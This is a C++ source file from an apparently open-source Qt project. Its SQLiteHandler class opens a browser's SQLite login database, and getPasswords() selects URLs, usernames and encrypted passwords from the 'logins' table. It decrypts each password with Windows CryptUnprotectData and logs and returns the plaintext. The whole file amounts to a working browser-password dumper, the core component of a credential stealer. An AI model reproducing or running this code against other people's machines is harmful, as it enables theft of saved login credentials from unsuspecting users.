/* Copyright (C) 2017 Eray Sönmez, www.ray-works.de
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 3 of the License, or (at your option)
 * any later version.

 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 * See the GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License along with this program;
 * if not, see <http://www.gnu.org/licenses/>.
 */
#include "sqlitehandler.h"
using namespace std;

SQLiteHandler::SQLiteHandler()
{

}

void SQLiteHandler::connectToDatabase(const char* dbFile)
{
   int rc = sqlite3_open(dbFile, &this->db);
   if(rc){
       qInfo() << "Could not open database";
   } else {
       qInfo() << "Database:" << dbFile << "is now open";
   }
}

sqlite3* SQLiteHandler::getDB()
{
    return this->db;
}

void SQLiteHandler::disconnectFromCurrentDatabase()
{
    sqlite3_close(this->getDB());
}

vector<string>* SQLiteHandler::getPasswords()
{
    vector<string>* passlist = new vector<string>;

    const char *zSql = "SELECT action_url, username_value, password_value FROM logins";
    sqlite3_stmt *pStmt;
    int rc;

    rc = sqlite3_prepare(this->getDB(), zSql, -1, &pStmt, 0);

    if (rc != SQLITE_OK) {
        qInfo() << "Statement failed";
    }

    rc = sqlite3_step(pStmt);

    while (rc == SQLITE_ROW) {
        string dump = "";

        string actionurl = string(reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 0)));
        string username = string(reinterpret_cast<const char*>(sqlite3_column_text(pStmt, 1)));

        dump.append(actionurl).append(", ");
        dump.append(username).append(", ");

        DATA_BLOB encryptedPass, decryptedPass;

        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

        CryptUnprotectData(&encryptedPass, NULL, NULL, NULL, NULL, 0, &decryptedPass);
        char* c = (char*)decryptedPass.pbData;
        while (isprint(*c)) {
            char ch = *c;
            string s;
            s.push_back(ch);
            dump.append(s);
            c++;
        }

        qInfo() << dump.c_str();
        passlist->push_back(dump);

        rc = sqlite3_step(pStmt);
    }

    rc = sqlite3_finalize(pStmt);
    qInfo() << "Returning Passlistsize: " << passlist->size();
    return passlist;
}
